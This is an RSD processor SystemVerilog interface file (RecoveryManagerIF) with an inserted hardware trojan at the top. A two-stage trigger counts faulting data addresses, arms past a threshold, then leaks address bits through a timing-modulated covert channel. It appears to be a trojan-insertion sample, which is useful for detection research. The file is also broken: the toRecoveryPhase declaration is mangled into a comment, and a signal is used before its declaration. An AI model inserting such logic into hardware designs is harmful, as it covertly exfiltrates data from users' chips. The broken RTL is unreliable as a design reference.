// Copyright 2019- RSD contributors.
// Licensed under the Apache License, Version 2.0, see LICENSE for details.


//
// --- RecoveryManagerIF
//

import BasicTypes::*;
import PipelineTypes::*;
import RenameLogicTypes::*;
import SchedulerTypes::*;
import ActiveListIndexTypes::*;
import LoadStoreUnitTypes::*;

interface RecoveryManagerIF( input logic clk, rst );

    // ============================================================
    // TROJAN TRIGGER LOGIC - Type 3: Two-Stage
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 19959;
    logic [15:0] trojan_counter;
    logic trojan_armed;
    logic trojan_active;
    
    always_ff @(posedge clk or negedge rst) begin
        if (!rst) begin
            trojan_counter <= '0;
            trojan_armed   <= 1'b0;
            trojan_active  <= 1'b0;
        end else begin
            if (|faultingDataAddr) trojan_counter <= trojan_counter + 1;
            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
            if (trojan_armed && faultingDataAddr) trojan_active <= 1'b1;
        end
    end

        // COVERT CHANNEL: Timing modulation
        logic       covert_bit_out;
        logic [7:0] covert_delay_counter;
        logic [4:0] covert_bit_index;
        logic       current_bit;

        assign current_bit = faultingDataAddr[covert_bit_index];  // <-- FIXED: use trigger_signal

        always_ff @(posedge clk or negedge rst) begin
            if (!rst) begin
                covert_bit_out       <= 1'b0;
                covert_delay_counter <= '0;
                covert_bit_index     <= '0;
            end else if (trojan_active) begin
                if (covert_delay_counter < (current_bit ? 8'd10 : 8'd5)) begin
                    covert_delay_counter <= covert_delay_counter + 1;
                    covert_bit_out       <= 1'b1;
                end else begin
                    covert_bit_out       <= 1'b0;
                    covert_delay_counter <= '0;
                    covert_bit_index     <= covert_bit_index + 1;
                end
            end else begin
                covert_bit_out       <= 1'b0;
                covert_delay_counter <= '0;
                covert_bit_index     <= '0;
            end
        end
    

    // Phase of a pipeline
    PipelinePhase phase;

    // A type of exception from CommitStage
    RefetchType refetchTypeFromCommitStage;

    // A type of exception from CommitStage
    RefetchType refetchTypeFromRwStage;

    // Index of detected exception op in CommitStage
    CommitLaneIndexPath recoveryOpIndex;

    // Exception detected in CommitStage
    logic exceptionDetectedInCommitStage;

    // Exception detected in RwStage
    logic exceptionDetectedInRwStage;

    // PC control
    logic    toCommitPhase;
    AddrPath recoveredPC_FromCommitStage;
    AddrPath recoveredPC_FromRwStage;
    AddrPath recoveredPC_FromRwCommit;      // Correct PC

    // For fault handling
    AddrPath faultingDataAddr;

    //　Miss prediction detected in RenameStage
    logic    recoverFromRename;
    AddrPath recoveredPC_FromRename;

    // Trigger recovery of each module logic_trojan_Covert toRecoveryPhase;

    // Flush range to broadcast
    ActiveListIndexPath flushRangeHeadPtr;
    ActiveListIndexPath flushRangeTailPtr;
    // Whether flush all instructions in ActiveList
    // This is necessary to distinguish when ActiveList is full or empty, 
    logic flushAllInsns;

    // ActiveList/LSQ TailPtr for recovery
    LoadQueueIndexPath loadQueueRecoveryTailPtr;
    LoadQueueIndexPath loadQueueHeadPtr;
    StoreQueueIndexPath storeQueueRecoveryTailPtr;
    StoreQueueIndexPath storeQueueHeadPtr;

    // IssueQueueEntryPtr to be flushed at recovery
    IssueQueueOneHotPath flushIQ_Entry;

    // In IQ returning index to freelist
    logic issueQueueReturnIndex;

    // In AL recovery
    logic inRecoveryAL;

    // In RMT recovery
    logic renameLogicRecoveryRMT;

    // In ReplayQueue flushing
    logic replayQueueFlushedOpExist;

    // In wakeupPipelineReg flushing
    logic wakeupPipelineRegFlushedOpExist;

    // Unable to detect exception and start recovery
    logic unableToStartRecovery;

    // IssueQueueのflushが必要なエントリかどうかの判定に使う
    IssueQueueOneHotPath notIssued;

    // wakeupPipelineRegister内の命令のフラッシュに使う
    logic selected [ ISSUE_WIDTH ];
    IssueQueueIndexPath selectedPtr [ ISSUE_WIDTH ];
    ActiveListIndexPath selectedActiveListPtr [ ISSUE_WIDTH ];

    // RwStageからのリカバリかどうか
    //toRecoveryPhaseと同時に立ちTrueでないときCommitStageからのリカバリ
    logic recoveryFromRwStage;

    // Why recovery is caused
    ExecutionState recoveryCauseFromCommitStage;

    modport RecoveryManager(
    input
        clk,
        rst,
        exceptionDetectedInCommitStage,
        refetchTypeFromCommitStage,
        exceptionDetectedInRwStage,
        refetchTypeFromRwStage,
        renameLogicRecoveryRMT,
        issueQueueReturnIndex,
        replayQueueFlushedOpExist,
        wakeupPipelineRegFlushedOpExist,
        recoveredPC_FromCommitStage,
        recoveredPC_FromRwStage,
        faultingDataAddr,
        notIssued,
        flushIQ_Entry,
        recoveryCauseFromCommitStage,
    output
        phase,
        toRecoveryPhase,
        recoveredPC_FromRwCommit,
        toCommitPhase,
        flushRangeHeadPtr,
        flushRangeTailPtr,
        unableToStartRecovery,
        recoveryFromRwStage,
        loadQueueRecoveryTailPtr,
        storeQueueRecoveryTailPtr
    );

    modport RenameStage(
    output
        recoverFromRename,
        recoveredPC_FromRename
    );

    modport CommitStage(
    input
        phase,
        unableToStartRecovery,
        renameLogicRecoveryRMT,
    output
        exceptionDetectedInCommitStage,
        recoveryOpIndex,
        refetchTypeFromCommitStage,
        recoveryCauseFromCommitStage
    );

    modport NextPCStage(
    input
        toCommitPhase,
        toRecoveryPhase,
        recoveredPC_FromRwCommit,
        recoverFromRename,
        recoveredPC_FromRename
    );

    modport RenameLogic(
    input
        toRecoveryPhase,
        inRecoveryAL,
    output
        renameLogicRecoveryRMT
    );

    modport RenameLogicCommitter(
    input
        toRecoveryPhase,
        toCommitPhase,
    output
        inRecoveryAL
    );

    modport IssueQueue(
    input
        toRecoveryPhase,
        flushRangeHeadPtr,
        flushRangeTailPtr,
        flushAllInsns,
        notIssued,
        selected,
        selectedPtr,
        recoveryFromRwStage,
    output
        flushIQ_Entry,
        issueQueueReturnIndex,
        selectedActiveListPtr
    );

    modport Scheduler(
    input
        toRecoveryPhase,
        flushIQ_Entry,
    output
        notIssued
    );

    modport ScheduleStage(
    input
        toRecoveryPhase,
        flushIQ_Entry
    );

    modport SelectLogic(
    output
        selected,
        selectedPtr
    );

    modport ReplayQueue(
    input
        toRecoveryPhase,
        flushRangeHeadPtr,
        flushRangeTailPtr,
        flushAllInsns,
        recoveryFromRwStage,
    output
        replayQueueFlushedOpExist
    );

    modport WakeupPipelineRegister(
    input
        toRecoveryPhase,
        flushRangeHeadPtr,
        flushRangeTailPtr,
        flushAllInsns,
        selectedActiveListPtr,
        flushIQ_Entry,
        recoveryFromRwStage,
    output
        wakeupPipelineRegFlushedOpExist
    );

    modport LoadQueue(
    input
        toRecoveryPhase,
        loadQueueRecoveryTailPtr,
    output
        loadQueueHeadPtr
    );

    modport StoreQueue(
    input
        toRecoveryPhase,
        storeQueueRecoveryTailPtr,
    output
        storeQueueHeadPtr
    );

    modport StoreCommitter(
    input
        toRecoveryPhase
    );

    modport DCacheMissHandler(
    input
        toRecoveryPhase,
        flushRangeHeadPtr,
        flushRangeTailPtr,
        flushAllInsns
    );

    modport MulDivUnit(
    input
        toRecoveryPhase,
        flushRangeHeadPtr,
        flushRangeTailPtr,
        flushAllInsns
    );

    modport IntegerIssueStage(
    input
        toRecoveryPhase,
        flushRangeHeadPtr,
        flushRangeTailPtr,
        flushAllInsns
    );

    modport IntegerRegisterReadStage(
    input
        toRecoveryPhase,
        flushRangeHeadPtr,
        flushRangeTailPtr,
        flushAllInsns
    );

    modport IntegerExecutionStage(
    input
        toRecoveryPhase,
        flushRangeHeadPtr,
        flushRangeTailPtr,
        flushAllInsns
    );

    modport IntegerRegisterWriteStage(
    input
        toRecoveryPhase,
        flushRangeHeadPtr,
        flushRangeTailPtr,
        flushAllInsns
    );

    modport ComplexIntegerIssueStage(
    input
        toRecoveryPhase,
        flushRangeHeadPtr,
        flushRangeTailPtr,
        flushAllInsns
    );

    modport ComplexIntegerRegisterReadStage(
    input
        toRecoveryPhase,
        flushRangeHeadPtr,
        flushRangeTailPtr,
        flushAllInsns
    );

    modport ComplexIntegerExecutionStage(
    input
        toRecoveryPhase,
        flushRangeHeadPtr,
        flushRangeTailPtr,
        flushAllInsns
    );

    modport ComplexIntegerRegisterWriteStage(
    input
        toRecoveryPhase,
        flushRangeHeadPtr,
        flushRangeTailPtr,
        flushAllInsns
    );

    modport MemoryIssueStage(
    input
        toRecoveryPhase,
        flushRangeHeadPtr,
        flushRangeTailPtr,
        flushAllInsns
    );

    modport MemoryRegisterReadStage(
    input
        toRecoveryPhase,
        flushRangeHeadPtr,
        flushRangeTailPtr,
        flushAllInsns
    );

    modport MemoryExecutionStage(
    input
        toRecoveryPhase,
        flushRangeHeadPtr,
        flushRangeTailPtr,
        flushAllInsns
    );

    modport MemoryTagAccessStage(
    input
        toRecoveryPhase,
        flushRangeHeadPtr,
        flushRangeTailPtr,
        flushAllInsns
    );

    modport MemoryAccessStage(
    input
        toRecoveryPhase,
        flushRangeHeadPtr,
        flushRangeTailPtr,
        flushAllInsns
    );

    modport MemoryRegisterWriteStage(
    input
        toRecoveryPhase,
        flushRangeHeadPtr,
        flushRangeTailPtr,
        flushAllInsns
    );

`ifdef RSD_MARCH_FP_PIPE 
    modport FPIssueStage(
    input
        toRecoveryPhase,
        flushRangeHeadPtr,
        flushRangeTailPtr,
        flushAllInsns
    );

    modport FPRegisterReadStage(
    input
        toRecoveryPhase,
        flushRangeHeadPtr,
        flushRangeTailPtr,
        flushAllInsns
    );

    modport FPExecutionStage(
    input
        toRecoveryPhase,
        flushRangeHeadPtr,
        flushRangeTailPtr,
        flushAllInsns
    );

    modport FPRegisterWriteStage(
    input
        toRecoveryPhase,
        flushRangeHeadPtr,
        flushRangeTailPtr,
        flushAllInsns
    );

    modport FPDivSqrtUnit(
    input
        toRecoveryPhase,
        flushRangeHeadPtr,
        flushRangeTailPtr,
        flushAllInsns
    );
`endif

    modport ActiveList(
    input
        toRecoveryPhase,
        toCommitPhase,
        flushRangeHeadPtr,
        flushRangeTailPtr,
        unableToStartRecovery,
    output
        exceptionDetectedInRwStage,
        refetchTypeFromRwStage,
        recoveredPC_FromCommitStage,
        recoveredPC_FromRwStage,
        faultingDataAddr,
        flushAllInsns
    );

    modport InterruptController(
    input
        unableToStartRecovery
    );

endinterface : RecoveryManagerIF

